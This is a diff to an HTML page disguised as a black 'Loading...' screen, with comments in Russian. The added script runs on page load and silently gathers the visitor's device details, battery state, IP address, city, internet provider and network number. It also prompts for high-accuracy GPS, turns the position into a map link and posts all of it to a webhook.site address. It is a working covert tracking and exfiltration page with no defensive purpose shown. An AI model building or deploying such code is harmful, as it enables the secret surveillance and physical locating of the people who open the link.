@@ -1,25 +1,73 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Loading...</title></head>
-<body style="background:black;">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>body { background: black; margin: 0; cursor: none; overflow: hidden; }</style>
+</head>
+<body>
 <script>
-    // Самая простая отправка
+(async () => {
     const hook = "https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2";
-    
-    // 1. Сначала просто "стучимся", чтобы ты увидел запрос в списке
-    fetch(hook, { mode: 'no-cors' });
 
-    // 2. Пробуем собрать данные об IP
-    fetch("https://ipapi.co/json/")
-        .then(r => r.json())
-        .then(data => {
-            // Если узнали IP, отправляем еще раз с данными
-            fetch(hook + "?ip=" + data.ip + "&city=" + data.city, { mode: 'no-cors' });
-        })
-        .catch(() => {
-            // Если IP заблокирован, шлем просто инфу о браузере
-            fetch(hook + "?info=" + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
+    // 1. Собираем базовое "железо" и софт
+    let info = {
+        time: new Date().toLocaleString(),
+        device: {
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            cores: navigator.hardwareConcurrency || "N/A",
+            ram: navigator.deviceMemory || "N/A",
+            screen: `${screen.width}x${screen.height}`,
+            lang: navigator.language
+        },
+        battery: "N/A",
+        location: "N/A",
+        gps: "Доступ запрещен"
+    };
+
+    // 2. Уровень заряда (если не на айфоне, там закрыто)
+    try {
+        const bat = await navigator.getBattery();
+        info.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Заряжается' : 'Разряжается'})`;
+    } catch(e) {}
+
+    // 3. Подробный IP, город и ПРОВАЙДЕР
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const d = await res.json();
+        info.location = {
+            ip: d.ip,
+            city: d.city,
+            region: d.region,
+            country: d.country_name,
+            isp: d.org, // КТО ПРОВАЙДЕР (Киевстар, Воля и т.д.)
+            asn: d.asn
+        };
+    } catch(e) {}
+
+    // 4. Запрос "ТОЧКИ НА КАРТЕ" (выскочит окно разрешения)
+    const getGPS = () => {
+        return new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (p) => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
+                () => resolve("Отклонено"),
+                { enableHighAccuracy: true }
+            );
         });
+    };
+    
+    if (navigator.geolocation) {
+        info.gps = await getGPS();
+    }
+
+    // 5. ФИНАЛЬНАЯ ОТПРАВКА
+    fetch(hook, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(info)
+    });
+})();
 </script>
 </body>
 </html>
